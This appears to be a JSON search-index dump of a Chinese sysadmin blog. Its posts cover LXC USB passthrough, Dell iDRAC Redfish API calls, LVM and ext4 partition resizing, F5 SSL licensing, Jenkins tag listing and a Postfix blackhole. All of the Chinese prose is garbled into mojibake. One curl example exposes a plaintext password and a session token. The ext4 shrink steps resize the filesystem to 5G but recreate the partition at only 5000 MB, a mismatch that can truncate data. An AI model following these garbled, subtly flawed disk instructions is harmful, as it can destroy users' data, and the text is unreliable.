OKï¼Œæå®šï¼Œæ‰€æœ‰çš„é…ç½®éƒ½åœ¨æ–‡ä»¶é‡Œï¼Œè¿˜æœ‰åˆ«çš„ç”¨æ³•ï¼Œå¤§å®¶ç”¨çš„è¯è‡ªå·±çœ‹æ–‡æ¡£å§ã€‚\næœ€ååˆ†åˆ«ä»10.10.1.2å’Œ10.10.1.3ä¸Šé¢ç”¨dig è¯·æ±‚dns server 10.10.1.1ï¼Œä¼šå¾—åˆ°ä¸åŒçš„ç»“æœ\n1dig -t www.bbb.com @10.10.1.1 ","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124_freelancer_8/","series":null,"tags":null,"title":"Freelancerä»»åŠ¡ä¹‹å…«openvpnçš„DNSåˆ†å‘"},{"categories":null,"content":"æµ‹è¯•çš„åŒäº‹è¦åœ¨æµ‹è¯•æœºä¸Šå®‰è£…android studioï¼Œadbç›´æ¥è°ƒè¯•æ‰‹æœºã€‚\nè¿™ä¸‹éº»çƒ¦äº†ï¼Œæµ‹è¯•æœºå®é™…æ˜¯ä¸ªlxcçš„å®¹å™¨ï¼Œéœ€è¦æŠŠæ’åœ¨å®¿ä¸»æœºusbä¸Šçš„æ‰‹æœºç›´æ¥è¿‡ç»™å®¹å™¨ã€‚\nè¯´ä¸‹åšæ³•ï¼š é¦–å…ˆåœ¨å®¿ä¸»æœºä¸Šæ‰§è¡Œlsusbï¼ŒæŸ¥å‡ºæ‰‹æœºUSBï¼š\n1[root@localhost]# lsusb 2Bus 001 Device 002: ID 8087:0024 Intel Corp. Integrated Rate Matching Hub 3Bus 002 Device 002: ID 8087:0024 Intel Corp. Integrated Rate Matching Hub 4Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub 5Bus 002 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub 6Bus 001 Device 014: ID 04e8:6860 Samsung Electronics Co., Ltd GT-I9100 Phone [Galaxy S II], GT-I9300 Phone [Galaxy S III], GT-P7500 [Galaxy Tab 10.1] , GT-I9500 [Galaxy S 4] 7Bus 001 Device 004: ID 0624:0248 Avocent Corp. Virtual Hub 8Bus 001 Device 005: ID 0624:0249 Avocent Corp. Virtual Keyboard/Mouse çœ‹æœ€é•¿çš„å¸¦GT-I9100é‚£ä¸€è¡Œï¼ŒID 04e8:6860ï¼ŒVendorID:ProdIDï¼Œè¯´æ˜Vendor=04e8 ProdID=6860ï¼Œè®°ä¸‹æ¥ã€‚\nå¹¶ä¸”è®°ä¸‹æ¥Bus 001ï¼ŒDevice 014\nä¸€åˆ‡è®¾å¤‡çš†æ–‡ä»¶ï¼Œçœ‹çœ‹å…·ä½“çš„æ–‡ä»¶å§ï¼š\n1ls -l /dev/bus/usb/001/014 2crw-rw-r--. 1 root root 189, 13 8æœˆ 29 10:31 /dev/bus/usb/001/014 è®°ä¸‹æ¥è¿™ä¸ª189\nç„¶åå»è™šæœºçš„é…ç½®æ–‡ä»¶é‡Œ æ³¨æ„ï¼Œæˆ‘ä»¬çš„lxcè™šæœºé…ç½®æ–‡ä»¶åœ¨/var/lib/docker/containers/bc2c9887fa72a59ab59f78b50677612608d40a2b73e8fd8fe0ffe25baa35edaa/config.lxcä¸­ï¼Œæˆ‘ä»¬çš„rootfsæ˜¯ï¼š\n1lxc.rootfs = /var/lib/docker/devicemapper/mnt/bc2c9887fa72a59ab59f78b50677612608d40a2b73e8fd8fe0ffe25baa35edaa/rootfs Soï¼Œåœ¨rootfsç›®å½•ä¸‹çš„config.lxcæ–‡ä»¶ä¸­å¢åŠ 2è¡Œï¼Œè®©usbè®¾å¤‡ç›´é€šè™šæœºï¼š\n1lxc.cgroup.devices.allow = c 189:* rwm 2lxc.mount.entry = /dev/bus/usb/001/014 /var/lib/docker/devicemapper/mnt/bc2c9887fa72a59ab59f78b50677612608d40a2b73e8fd8fe0ffe25baa35edaa/rootfs/dev/bus/usb/001/014 none bind,optional,create=file è¿˜æ²¡å®Œï¼š é‡å¯è™šæœºï¼Œè¿›å…¥å®¹å™¨ï¼Œå†™ä¸ªudevçš„rulesï¼Œè¿™ä¸ªæ²¡æµ‹è¯•æ˜¯å¦æœ‰å¿…è¦ï¼Œå› ä¸ºå…¶å®udevæœåŠ¡æ ¹æœ¬æ²¡åœ¨å®¹å™¨é‡Œè·‘å•Š\n1vi /etc/udev/rules.d/51-android.rules 2SUBSYSTEMS==\u0026#34;usb\u0026#34;, ATTRS{idVendor}==\u0026#34;04e8\u0026#34;, ATTRS{idProduct}==\u0026#34;6860\u0026#34;, MODE=\u0026#34;0666\u0026#34;, OWNER=\u0026#34;root\u0026#34; ç»§ç»­ï¼Œä¿®æ”¹å®¹å™¨ä¸­çš„adb_usb.iniï¼ŒæŠŠVendorIDåŠ è¿›å»\n1vi ~/.android/adb_usb.ini 2# ANDROID 3RD PARTY USB VENDOR ID LIST -- DO NOT EDIT. 3# USE \u0026#39;android update adb\u0026#39; TO GENERATE. 4# 1 USB VENDOR ID PER LINE. 50x04e8 é‡å¯å®¹å™¨ï¼Œadbè¢«è£…åœ¨/opt/sdk/platform-tools/è·¯å¾„ä¸‹ï¼Œè¿›å»åæ‰§è¡Œï¼š\n1/opt/sdk/platform-tools/adb start-server 2/opt/sdk/platform-tools/adb devices 3List of devices attached 40376b638 unauthorized OKæå®šã€‚\n","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-lxc_usb_pass_through/","series":null,"tags":null,"title":"Lxcä¸‹å¦‚ä½•è®©usbè®¾å¤‡pass Throughç›´æ¥åˆ°è¾¾è™šæœº"},{"categories":null,"content":"å„å¤§ä¸»æ¿å‚å•†çº·çº·æ”¯æŒä¸‹ä¸€ä»£å¸¦å¤–ç®¡ç†æ ‡å‡†redfishã€‚\nå…¶å®Dellçš„idracç®¡ç†åšçš„æ˜¯ç›¸å½“å¥½çš„ï¼Œé‚£ä¹ˆæ¥çœ‹çœ‹å¯¹redfishçš„æ”¯æŒå§ã€‚\nå…ˆçœ‹çœ‹v1éƒ½æœ‰ä»€ä¹ˆå‘½ä»¤\n1curl -s \u0026#34;https://10.16.24.15/redfish/v1\u0026#34; -k -u root:xxxxxxxx | jq . 2 3ç»“æœå¦‚ä¸‹ï¼š 4 5{ 6 \u0026#34;@odata.context\u0026#34;: \u0026#34;/redfish/v1/$metadata#ServiceRoot.ServiceRoot\u0026#34;, 7 \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1\u0026#34;, 8 \u0026#34;@odata.type\u0026#34;: \u0026#34;#ServiceRoot.v1_1_0.ServiceRoot\u0026#34;, 9 \u0026#34;AccountService\u0026#34;: { 10 \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Managers/iDRAC.Embedded.1/AccountService\u0026#34; 11 }, 12 \u0026#34;Chassis\u0026#34;: { 13 \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis\u0026#34; 14 }, 15 \u0026#34;Description\u0026#34;: \u0026#34;Root Service\u0026#34;, 16 \u0026#34;EventService\u0026#34;: { 17 \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/EventService\u0026#34; 18 }, 19 \u0026#34;Id\u0026#34;: \u0026#34;RootService\u0026#34;, 20 \u0026#34;JsonSchemas\u0026#34;: { 21 \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/JSONSchemas\u0026#34; 22 }, 23 \u0026#34;Links\u0026#34;: { 24 \u0026#34;Sessions\u0026#34;: { 25 \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Sessions\u0026#34; 26 } 27 }, 28 \u0026#34;Managers\u0026#34;: { 29 \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Managers\u0026#34; 30 }, 31 \u0026#34;Name\u0026#34;: \u0026#34;Root Service\u0026#34;, 32 \u0026#34;Oem\u0026#34;: { 33 \u0026#34;Dell\u0026#34;: { 34 \u0026#34;@odata.type\u0026#34;: \u0026#34;#DellServiceRoot.v1_0_0.ServiceRootSummary\u0026#34;, 35 \u0026#34;IsBranded\u0026#34;: 0, 36 \u0026#34;ManagerMACAddress\u0026#34;: \u0026#34;50:9A:4C:82:B9:3F\u0026#34;, 37 \u0026#34;ServiceTag\u0026#34;: \u0026#34;7Q9N8P2\u0026#34; 38 } 39 }, 40 \u0026#34;RedfishVersion\u0026#34;: \u0026#34;1.0.2\u0026#34;, 41 \u0026#34;Registries\u0026#34;: { 42 \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Registries\u0026#34; 43 }, 44 \u0026#34;SessionService\u0026#34;: { 45 \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/SessionService\u0026#34; 46 }, 47 \u0026#34;Systems\u0026#34;: { 48 \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Systems\u0026#34; 49 }, 50 \u0026#34;Tasks\u0026#34;: { 51 \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/TaskService\u0026#34; 52 }, 53 \u0026#34;UpdateService\u0026#34;: { 54 \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/UpdateService\u0026#34; 55 } 56} å¥½å¤šæœåŠ¡æ’’ï¼ŒæŒ‘å…¶ä¸­ä¸€ä¸ªåˆ†æ”¯çœ‹çœ‹ï¼š\n1curl -s \u0026#34;https://10.16.24.15/redfish/v1/Chassis\u0026#34; -k -u root:alibaba | jq . 2 3ç»“æœå¦‚ä¸‹ï¼š 4 5{ 6 \u0026#34;@odata.context\u0026#34;: \u0026#34;/redfish/v1/$metadata#ChassisCollection.ChassisCollection\u0026#34;, 7 \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis/\u0026#34;, 8 \u0026#34;@odata.type\u0026#34;: \u0026#34;#ChassisCollection.ChassisCollection\u0026#34;, 9 \u0026#34;Description\u0026#34;: \u0026#34;Collection of Chassis\u0026#34;, 10 \u0026#34;Members\u0026#34;: [ 11 { 12 \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis/System.Embedded.1\u0026#34; 13 }, 14 { 15 \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis/Enclosure.Internal.0-1:RAID.Integrated.1-1\u0026#34; 16 } 17 ], 18 \u0026#34;Members@odata.count\u0026#34;: 2, 19 \u0026#34;Name\u0026#34;: \u0026#34;Chassis Collection\u0026#34; 20} å†è¯•è¯•Sessionçš„ç®¡ç†ï¼š\n1curl -v -k -X POST -d \u0026#39;{\u0026#34;UserName\u0026#34;:\u0026#34;root\u0026#34;,\u0026#34;Password\u0026#34;:\u0026#34;xxxxxxxx\u0026#34;}\u0026#39; -H \u0026#34;Content-Type: application/json\u0026#34; https://10.16.24.15/redfish/v1/Sessions | jq . æ³¨æ„Dellå®˜æ–¹çš„æ–‡æ¡£é‡Œå±…ç„¶ä¸æjsonçš„äº‹ï¼Œç›´æ¥ç”¨å®ƒç»™çš„å‘½ä»¤ä¼šæŠ¥é”™çš„ï¼Œpostçš„æ•°æ®æ˜æ˜¾æ˜¯ä¸ªjsonã€‚\n1ç»“æœï¼š 2 3* About to connect() to 10.16.24.15 port 443 (#0) 4* Trying 10.16.24.15... connected 5* Connected to 10.16.24.15 (10.16.24.15) port 443 (#0) 6* Initializing NSS with certpath: sql:/etc/pki/nssdb 7* warning: ignoring value of ssl.verifyhost 8* skipping SSL peer certificate verification 9* SSL connection using TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 10* Server certificate: 11* subject: E=support@dell.com,CN=idrac-7Q9N8P2,OU=Remote Access Group,O=Dell Inc.,L=Round Rock,ST=Texas,C=US 12* start date: Mar 15 06:13:00 2018 GMT 13* expire date: Mar 15 06:14:22 2028 GMT 14* common name: idrac-7Q9N8P2 15* issuer: E=support@dell.com,CN=idrac-7Q9N8P2,OU=Remote Access Group,O=Dell Inc.,L=Round Rock,ST=Texas,C=US 16\u0026gt; POST /redfish/v1/Sessions HTTP/1.1 17\u0026gt; User-Agent: curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.21 Basic ECC zlib/1.2.3 libidn/1.18 libssh2/1.4.2 18\u0026gt; Host: 10.16.24.15 19\u0026gt; Accept: */* 20\u0026gt; Content-Type: application/json 21\u0026gt; Content-Length: 39 22\u0026gt; 23} [data not shown] 24\u0026lt; HTTP/1.1 201 Created 25\u0026lt; OData-Version: 4.0 26\u0026lt; Keep-Alive: timeout=60, max=199 27\u0026lt; Content-Type: application/json;odata.metadata=minimal;charset=utf-8 28\u0026lt; Server: iDRAC/8 29\u0026lt; Location: /redfish/v1/Sessions/13 30\u0026lt; Date: Wed, 05 Sep 2018 08:26:55 GMT 31\u0026lt; X-Auth-Token: d42c621ee25ad8b49c0d24bbd763f54f 32\u0026lt; Cache-Control: no-cache 33\u0026lt; Content-Length: 745 34\u0026lt; Connection: Keep-Alive 35\u0026lt; Access-Control-Allow-Origin: * 36\u0026lt; Accept-Ranges: bytes 37\u0026lt; 38{ [data not shown] 39* Connection #0 to host 10.16.24.15 left intact 40* Closing connection #0 41{ 42 \u0026#34;@Message.ExtendedInfo\u0026#34;: [ 43 { 44 \u0026#34;Message\u0026#34;: \u0026#34;The resource has been created successfully\u0026#34;, 45 \u0026#34;MessageArgs\u0026#34;: [], 46 \u0026#34;MessageArgs@odata.count\u0026#34;: 0, 47 \u0026#34;MessageId\u0026#34;: \u0026#34;Base.1.0.Created\u0026#34;, 48 \u0026#34;RelatedProperties\u0026#34;: [], 49 \u0026#34;RelatedProperties@odata.count\u0026#34;: 0, 50 \u0026#34;Resolution\u0026#34;: \u0026#34;None\u0026#34;, 51 \u0026#34;Severity\u0026#34;: \u0026#34;OK\u0026#34; 52 }, 53 { 54 \u0026#34;Message\u0026#34;: \u0026#34;A new resource is successfully created.\u0026#34;, 55 \u0026#34;MessageArgs\u0026#34;: [], 56 \u0026#34;MessageArgs@odata.count\u0026#34;: 0, 57 \u0026#34;MessageId\u0026#34;: \u0026#34;IDRAC.1.6.SYS414\u0026#34;, 58 \u0026#34;RelatedProperties\u0026#34;: [], 59 \u0026#34;RelatedProperties@odata.count\u0026#34;: 0, 60 \u0026#34;Resolution\u0026#34;: \u0026#34;No response action is required.\u0026#34;, 61 \u0026#34;Severity\u0026#34;: \u0026#34;Informational\u0026#34; 62 } 63 ], 64 \u0026#34;@odata.context\u0026#34;: \u0026#34;/redfish/v1/$metadata#Session.Session\u0026#34;, 65 \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Sessions/13\u0026#34;, 66 \u0026#34;@odata.type\u0026#34;: \u0026#34;#Session.v1_0_2.Session\u0026#34;, 67 \u0026#34;Description\u0026#34;: \u0026#34;User Session\u0026#34;, 68 \u0026#34;Id\u0026#34;: \u0026#34;13\u0026#34;, 69 \u0026#34;Name\u0026#34;: \u0026#34;User Session\u0026#34;, 70 \u0026#34;Password\u0026#34;: null, 71 \u0026#34;UserName\u0026#34;: \u0026#34;root\u0026#34; 72} è®°ä¸‹è¿™è¡Œï¼šX-Auth-Token: d42c621ee25ad8b49c0d24bbd763f54f\nè¯•è¯•è¿™ç§Sessionçš„åŠŸæ•ˆ\n1curl -k https://10.16.24.15/redfish/v1/Chassis -s --header \u0026#34;X-Auth-Token: d42c621ee25ad8b49c0d24bbd763f54f\u0026#34; | jq . 2 3ç»“æœï¼š 4 5{ 6 \u0026#34;@odata.context\u0026#34;: \u0026#34;/redfish/v1/$metadata#ChassisCollection.ChassisCollection\u0026#34;, 7 \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis/\u0026#34;, 8 \u0026#34;@odata.type\u0026#34;: \u0026#34;#ChassisCollection.ChassisCollection\u0026#34;, 9 \u0026#34;Description\u0026#34;: \u0026#34;Collection of Chassis\u0026#34;, 10 \u0026#34;Members\u0026#34;: [ 11 { 12 \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis/System.Embedded.1\u0026#34; 13 }, 14 { 15 \u0026#34;@odata.id\u0026#34;: \u0026#34;/redfish/v1/Chassis/Enclosure.Internal.0-1:RAID.Integrated.1-1\u0026#34; 16 } 17 ], 18 \u0026#34;Members@odata.count\u0026#34;: 2, 19 \u0026#34;Name\u0026#34;: \u0026#34;Chassis Collection\u0026#34; 20} æå®šï¼Œå¦‚æœè¿˜æƒ³éœ€è¦æ›´å¤šçš„åŠŸèƒ½ï¼Œå°±å»çœ‹æ‰‹å†Œå§ã€‚\n","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-dell_redfish/","series":null,"tags":null,"title":"Dellçš„idrac Redfishåˆæ¢"},{"categories":null,"content":"ç³»ç»Ÿæ˜¯xfsæ–‡ä»¶æ ¼å¼ã€‚/rootç©ºé—´ä¸å¤Ÿäº†ã€‚å¿…é¡»å¯¹ç©ºé—´è¿›è¡Œè°ƒæ•´ï¼Œæ‚²å‰§çš„æ˜¯xfsåªèƒ½å¢åŠ ç©ºé—´ï¼Œä¸èƒ½ç¼©å‡ç©ºé—´ï¼Œå¿…é¡»æ›²çº¿æ•‘å›½äº†ã€‚\næŸ¥çœ‹ä¸€ä¸‹ï¼Œç¼ºçœæœ‰ä¸¤ä¸ªlvmçš„åˆ†åŒº\n1/dev/mapper/centos-root 40G 2/dev/mapper/centos-home 20G åªèƒ½å‡å°homeåˆ†åŒºï¼Œå†å¢å¤§rootåˆ†åŒºäº†ã€‚\nå…ˆå¤‡ä»½homeåˆ†åŒºï¼Œå¹¶ç¼©å°åˆ°2Gï¼š\n1# yum -y install xfsdump 2# xfsdump -f /home.xfsdump /home 3please enter label for this dump session (timeout in 300 sec) 4-\u0026gt; home 5please enter label for media in drive 0 (timeout in 300 sec) 6-\u0026gt; home 7# umount /home 8# lvreduce -L 2G /dev/mapper/centos-home 9Do you really want to reduce home? [y/n]: y ç„¶åæ‰©å……rootåˆ†åŒºï¼š\n1# lvextend -L +18G /dev/mapper/centos-root 2# xfs_growfs /dev/mapper/centos-root æœ€åæ¢å¤homeåˆ†åŒº\n1# mkfs.xfs -f /dev/mapper/centos-home 2# mount /home 3# xfsrestore -f /home.xfsdump /home æå®š\n","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-lvm_resize/","series":null,"tags":null,"title":"LVMè°ƒæ•´åˆ†åŒºå¤§å°"},{"categories":null,"content":"å…¬å¸ç”¨åˆ°äº†SSLçš„æ³›åŸŸåè¯ä¹¦ï¼Œç½‘ç«™æ•´ä½“å¥—ä¸Šäº†HTTPSï¼Œç„¶åæœ€å‰é¢æ˜¯F5åšSSLçš„å¸è½½ã€‚\néº»çƒ¦ä¹Ÿæ¥äº†ï¼ŒF5çš„SSL Transactions Per Second (TPS) æ˜¯æœ‰licenseçš„ï¼Œé¦–å…ˆæ£€æŸ¥ä¸€ä¸‹å§\n1tmsh show sys license detail | grep -i perf_SSL_total_TPS 2perf_SSL_total_TPS [500] æ˜¾ç¤ºæ˜¯500\nè¿˜å¾—æŸ¥æŸ¥æœ‰å‡ ä¸ªæ ¸å¿ƒ\n1tmsh show sys tmm-info global | grep -i \u0026#39;TMM count\u0026#39; 2TMM Count 4 4ä¸ªæ ¸å¿ƒ\né‚£ä¹ˆæ¯ç§’SSLçš„TPSé™åˆ¶å°±æ˜¯ 500X4=2000\nè¶…è¿‡2000å°±å¾—å»å¢åŠ licenseäº†ã€‚\n","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-f5_bigip_ssl/","series":null,"tags":null,"title":"F5-Bigipçš„SSLæ¯ç§’ä¼ è¾“(TPS)é™åˆ¶"},{"categories":null,"content":"åœºæ™¯æ˜¯è¿™æ ·çš„ï¼Œæœ‰ä¸¤å°jenkinsã€‚ä¸€å°æ˜¯æ­£å¸¸å®‰è£…åœ¨linuxä¸Šçš„ï¼Œå¦å¤–ä¸€å°æ˜¯åœ¨macosä¸Šçš„ã€‚\nåœ¨macosä¸Šçš„è¿™å°ï¼Œè£…äº†æœ‰xcodeå’Œandroid studioï¼Œè´Ÿè´£ipaå’Œapkçš„è‡ªåŠ¨æ‰“åŒ…ã€‚\nè€Œåœ¨linuxä¸Šjenkinsåˆ™æ˜¯ä¸»jenkinsï¼Œè´Ÿè´£å¾ˆå¤šé¡¹ç›®çš„æ‰“åŒ…ã€‚\nè¿™æ ·ä¸¤å°çš„ç›®æ ‡å°±éƒ½å¾ˆæ˜ç¡®ï¼Œéº»çƒ¦çš„æ˜¯éœ€è¦æ¥å›ç™»å½•æ¥æ„å»ºé¡¹ç›®ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰æ–¹æ³•ä»ç¬¬ä¸€å°ä¸Šç›´æ¥è°ƒç”¨ç¬¬äºŒå°çš„é¡¹ç›®è¿›è¡Œæ„å»ºå‘¢ï¼Ÿ\nå½“ç„¶å¯ä»¥ï¼Œç›´æ¥å‘ä¸ªå¸¦Tokençš„urlåˆ°ç¬¬äºŒå°å°±å¯ä»¥ã€‚\nè¿™ä¸ªä¸æ˜¯æœ¬æ–‡çš„é‡ç‚¹ï¼Œæœ¬æ–‡é‡ç‚¹ï¼Œæºç æ˜¯Gitçš„buildè¿‡ç¨‹ï¼Œjenkinsè£…äº†Git parameteræ’ä»¶åæ”¯æŒé€‰tagè¿›è¡Œbuildingã€‚\nè¿™æ ·å¦‚æœä¸¤å°éƒ½è¿™ä¹ˆæ¥ä¸€ä¸‹ï¼Œå®é™…æ˜¯åœ¨ä¸¤å°éƒ½git checkäº†ä¸€ä¸‹ï¼Œç„¶åå¼€å§‹buildï¼Œè¿™å¯¹äºç¬¬ä¸€å°æ¥è¯´ï¼Œæ¯«æ— å¿…è¦ã€‚\nç¬¬ä¸€å°ä¸»jenkinsçš„ä»»åŠ¡å°±æ˜¯çœ‹çœ‹gité¡¹ç›®ä¸­éƒ½æœ‰ä»€ä¹ˆtagï¼Œç„¶åæŠŠtagå‘é“¾æ¥ç»™ç¬¬äºŒå°å³å¯ï¼Œæ²¡å¿…è¦checkçš„ã€‚\nè€Œç¬¬äºŒå°ä¹Ÿä¸å»çœ‹tagï¼Œç›´æ¥ä»gitä¸­checkoutå‡ºç¬¬ä¸€å°ä¼ è¿‡æ¥çš„tagç‰ˆæœ¬ï¼Œè¿›è¡Œæ„é€ ï¼Œè¿™æ ·æœ€çœèµ„æºã€‚\né‚£ä¹ˆï¼Œæ€ä¹ˆè®©ç¬¬ä¸€å°åªæŸ¥çœ‹tagå‘¢ï¼Ÿ\nä¸‡èƒ½çš„groovyå¤§æ³•ï¼š\n1def gettags = \u0026#34;git ls-remote -t git@git.coding.net:doabc/app-abc.git\u0026#34;.execute() 2def tags = [] 3def t1 = [] 4gettags.text.eachLine {tags.add(it)} 5for(i in tags) 6 t1.add(i.split()[1].replaceAll(\u0026#39;\\\\^\\\\{\\\\}\u0026#39;, \u0026#39;\u0026#39;).replaceAll(\u0026#39;refs/tags/\u0026#39;, \u0026#39;\u0026#39;)) 7t1 = t1.unique() 8return t1 æ³¨æ„ä¸Šé¢ï¼Œgroovyå’Œgitçš„è¯ä¹¦éœ€è¦éƒ½äº‹å…ˆé…å¥½ã€‚\n","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-jenkins_two_server/","series":null,"tags":null,"title":"ä¸¤å°ä¸åŒç³»ç»Ÿä¸ŠJenkinsçš„è”åŠ¨"},{"categories":null,"content":"é…ç½®postfixå…è®¸è‡ªç”±è½¬å‘å†…ç½‘çš„é‚®ä»¶ï¼Œå°±æ”¹ä¸€ä¸ªåœ°æ–¹å³å¯ï¼Œæ·»åŠ å…è®¸å‘é€çš„å†…ç½‘ç½‘æ®µï¼š\n1vi /etc/postfix/main.cf 2... 3mynetworks = 127.0.0.0/8, 172.16.0.0/16 4... é…ç½®é»‘æ´ï¼Œæ‰€æœ‰é‚®ä»¶éƒ½æ¥å—ï¼Œç„¶ådropä¸¢æ‰\n1relayhost = 2relay_transport = relay 3relay_domains = static:ALL 4smtpd_end_of_data_restrictions = check_client_access static:discard å½“ç„¶ï¼Œä¹Ÿå¯ä»¥æŠŠè¿™äº›é‚®ä»¶éƒ½ç»™é€åˆ°amaviså»ï¼Œè®­ç»ƒå®ƒè¯†åˆ«åƒåœ¾é‚®ä»¶\næµ‹è¯•é‚®ä»¶å‘é€çš„å‘½ä»¤ï¼š\n1echo \u0026#34;body of your email\u0026#34; | mail -s \u0026#34;This is a Subject os version\u0026#34; -r \u0026#34;abc@kindlefan.xin\u0026#34; test@abc.com æ³¨æ„ï¼šCentOSå’ŒUbuntué»˜è®¤å±…ç„¶éƒ½æ²¡æœ‰mailè¿™æ¡å‘½ä»¤çš„è¯\n1yum install mailx 2apt-get install bsd-mailx ","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-postfix_blackhole/","series":null,"tags":null,"title":"é…ç½®postfixè½¬å‘å±€åŸŸç½‘é‚®ä»¶ä»¥åŠé‚®ä»¶é»‘æ´"},{"categories":null,"content":"ç¼©å°/ çš„ext4åˆ†åŒºæ­¥éª¤å¦‚ä¸‹ï¼š\né¦–å…ˆæŸ¥çœ‹åˆ†åŒºæ˜¯ä»€ä¹ˆæ–‡ä»¶ç±»å‹\n1file -sL /dev/sd* 2/dev/sda: x86 boot sector; GRand Unified Bootloader, stage1 version 0x3, boot drive 0x80, 1st sector stage2 0x2044148, GRUB version 0.94; partition 1: ID=0x82, starthead 32, startsector 2048, 8388608 sectors; partition 2: ID=0x83, active, starthead 75, startsector 8390656, 411039744 sectors, code offset 0x48 3/dev/sda1: Linux/i386 swap file (new style) 1 (4K pages) size 1048575 pages 4/dev/sda2: Linux rev 1.0 ext4 filesystem data (needs journal recovery) (extents) (large files) (huge files) èƒ½çœ‹å‡ºæ¥sda1æ˜¯äº¤æ¢åˆ†åŒºï¼Œé‚£ä¹ˆè¦ç¼©çš„åˆ†åŒºæ˜¯/dev/sda2ï¼Œæ–‡ä»¶ç±»å‹æ˜¯ext4\nokï¼Œå…ˆç¡®ä¿è™šæœºå†…/åˆ†åŒºåªå åˆ°5Gï¼Œç„¶åæœ€å¥½é‡æ–°æ‹·è´ä¸€ä¸‹qcow2æ–‡ä»¶ï¼ŒæŠŠæ–‡ä»¶åˆ°å¼„åˆ°å‰é¢5Gä¸­ã€‚\nç„¶åä¿®æ”¹ä¸€ä¸‹kvmè™šæœºé…ç½®ï¼Œå…ˆåŠ ä¸ªisoè¿›å…¥rescueæ¨¡å¼\n1virsh edit xxx 2æŠŠbooté¡ºåºä»hdæ”¹æˆcdrom 3 4... 5 \u0026lt;boot dev=\u0026#39;hd\u0026#39;/\u0026gt; 6 \u0026lt;boot dev=\u0026#39;cdrom\u0026#39;/\u0026gt; 7... 8 \u0026lt;disk type=\u0026#39;file\u0026#39; device=\u0026#39;cdrom\u0026#39;\u0026gt; 9 \u0026lt;driver name=\u0026#39;qemu\u0026#39; type=\u0026#39;raw\u0026#39;/\u0026gt; 10 \u0026lt;source file=\u0026#39;/export/kvm/iso/CentOS-7-x86_64-NetInstall-1708.iso\u0026#39;/\u0026gt; 11 \u0026lt;target dev=\u0026#39;hdc\u0026#39; bus=\u0026#39;ide\u0026#39;/\u0026gt; 12 \u0026lt;readonly/\u0026gt; 13 \u0026lt;address type=\u0026#39;drive\u0026#39; controller=\u0026#39;0\u0026#39; bus=\u0026#39;1\u0026#39; target=\u0026#39;0\u0026#39; unit=\u0026#39;0\u0026#39;/\u0026gt; 14 \u0026lt;/disk\u0026gt; 15... ç³»ç»Ÿå¯åŠ¨ï¼Œè¿›å…¥cdromå®‰è£…ï¼Œé€‰æ‹©Troubleshooting\né€‰æ‹©Rescue\nå› ä¸ºè¦å¯¹ç£ç›˜æ“ä½œï¼Œæ‰€ä»¥ä¸èƒ½é€‰1æŠŠç¡¬ç›˜mountåˆ°/mnt/sysimageï¼Œé€‰æ‹©3ï¼Œä¸mountç¡¬ç›˜ï¼Œç›´æ¥è¿›å…¥ä¸€ä¸ªshell\næ£€æŸ¥ç£ç›˜ï¼Œç¼©å‡/dev/sda2 åˆ°5Gç©ºé—´\n1e2fsck -f /dev/sda2 2resize2fs /dev/sda2 5G æ³¨æ„ï¼Œç°åœ¨åªåšäº†ä¸€åŠï¼Œæ–‡ä»¶æ˜¯è¢«é›†ä¸­åˆ°/dev/sda2çš„å‰5Gç©ºé—´é‡Œé¢å»äº†ã€‚ä½†æ˜¯ï¼Œç¡¬ç›˜åˆ†åŒºè¿˜æ²¡æœ‰æ›´æ”¹ã€‚\næ¥ç€æ¥ï¼Œç”¨partedæ¥ä¿®æ”¹åˆ†åŒº\n1parted /dev/sda 2print 3æŸ¥çœ‹åå‘ç°å‰2096æ˜¯swapåˆ†åŒºï¼Œ2æ˜¯/dev/sda2 4åˆ é™¤/dev/sda2 5rm 2 6é‡å»º 7mkpart 8... primary 9... 2096 10... 7096 æ³¨æ„ï¼Œæ–°å»ºçš„/dev/sda2èµ·ç‚¹æ˜¯2096ï¼Œåˆ†åŒºç»ˆç‚¹æ˜¯2096+5000=7096\næœ€åå†è¿è¡Œä¸€ä¸‹ç£ç›˜æ£€æŸ¥å’Œé‡å»º\n1e2fsck -f /dev/sda2 2resize2fs /dev/sda2 5G 